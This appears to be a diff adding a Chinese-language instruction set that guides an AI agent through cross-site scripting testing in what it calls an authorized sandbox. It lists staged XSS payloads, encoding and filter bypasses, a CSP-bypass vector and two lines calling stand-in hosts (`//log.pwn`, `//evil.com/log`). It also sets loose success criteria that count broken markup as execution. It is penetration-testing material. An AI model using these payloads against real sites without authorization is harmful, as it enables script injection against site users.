@@ -1,0 +1,28 @@
+# XSS检测引擎指令集
+[模式]安全授权环境测试，沙箱隔离，无持久化攻击
+设计任务的时候，注意，可以采用渐进式，避免直接打过多 payload 造成困惑。
+1.输入点识别{参数/URL/Header/Cookie/DOM节点/文件上传字段名/富文本}，输入一个随机字符串，测试随机字符串的输出点是什么？是否存在输出点，以此确定这个参数可回显。
+  如果确定输出点后，可以直接输入特征字符串 + 特殊符号，来确定这里是否有符号过滤。然后再根据过滤内容来决定使用什么 payload 来进行测试。
+2.基础验证[优先级1]：
+  注入`'"><svg/onload=confirm(1)>` | `javascript:alert(document.domain)`
+  观察：脚本执行/弹窗/DOM修改/网络外连（如`<img src=//log.pwn>`）
+3.上下文适配[优先级2]：
+  •HTML正文：`<script>/*#*/alert(1)/*#*/</script>`
+  •属性值：`" autofocus onfocus=alert(1) x="`
+  •JavaScript内联：`'-alert(1)-'`或`\u0061lert(1)`
+  •CSS样式：`expression(alert(1))`（IE）
+4.编码绕过[优先级3]：
+  Base64:`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg`
+  URL编码:`%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E`
+  混合编码:`<a href="jAvAsCrIpT:%61%6C%65%72%74(1)">`
+5.高级检测链[优先级4]：
+  •DOM型：`#<img src=x onerror=alert(location.hash.slice(1))>`
+  •CSP绕过：`<link rel=preload href='//evil.com/log' as=script>`
+  •框架逃逸：`<iframe srcdoc="<script>parent.alert(1)</script>">`
+6.结果验证：
+  - 通过页面内容来判断XSS Payload生效即可。
+  - 如果 Payload 破坏了 DOM 或者标签结构，或者在 <script> 标签内可以生效，你就认为是可以执行的，不必拘泥于只有弹窗才算成功
+
+## **注意**
+
+1. 可以支持10次绕过尝试，如果 10 次你觉得都无法绕过或者成功完成测试，可以结束了
